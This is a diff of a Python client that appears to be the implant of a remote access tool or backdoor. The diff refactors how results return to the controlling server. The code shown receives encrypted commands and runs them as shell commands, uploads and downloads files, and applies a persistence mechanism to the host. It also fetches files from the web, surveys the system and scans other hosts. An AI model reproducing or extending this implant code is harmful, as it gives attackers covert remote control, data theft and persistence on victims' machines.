@@ -30,6 +30,7 @@ def main():
     client = common.Client(s, HOST, 1)
 
     while True:
+        results = ""
         data = client.recvGCM()
         if not data:
             continue
@@ -48,7 +49,6 @@ def main():
                       stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                       stdin=subprocess.PIPE)
             results = results.stdout.read() + results.stderr.read()
-            client.sendGCM(results)
 
         # send file
         elif cmd == 'download':
@@ -58,6 +58,7 @@ def main():
                     continue
 
                 client.sendfile(fname)
+                continue
 
         # receive file
         elif cmd == 'upload':
@@ -67,35 +68,19 @@ def main():
                     continue
 
                 client.recvfile(fname)
+                continue
 
         # # regenerate DH key
         # elif cmd == 'rekey':
         #     dh_key = crypto.diffiehellman(s)
 
-        # apply persistence mechanism
-        elif cmd == 'persistence':
-            results = persistence.run(PLAT)
-            client.sendGCM(results)
+        elif cmd == 'persistence':  results = persistence.run(PLAT)
+        elif cmd == 'wget':         results = toolkit.wget(action)
+        elif cmd == 'unzip':        results = toolkit.unzip(action)
+        elif cmd == 'survey':       results = survey.run(PLAT)
+        elif cmd == 'scan':         results = scan.single_host(action)
 
-        # download a file from the web
-        elif cmd == 'wget':
-            results = toolkit.wget(action)
-            client.sendGCM(results)
-
-        # unzip a file
-        elif cmd == 'unzip':
-            results = toolkit.unzip(action)
-            client.sendGCM(results)
-
-        # run system survey
-        elif cmd == 'survey':
-            results = survey.run(PLAT)
-            client.sendGCM(results)
-
-        # run a scan
-        elif cmd == 'scan':
-            results = scan.single_host(action)
-            client.sendGCM(results)
+        client.sendGCM(results)
 
 
 if __name__ == '__main__':
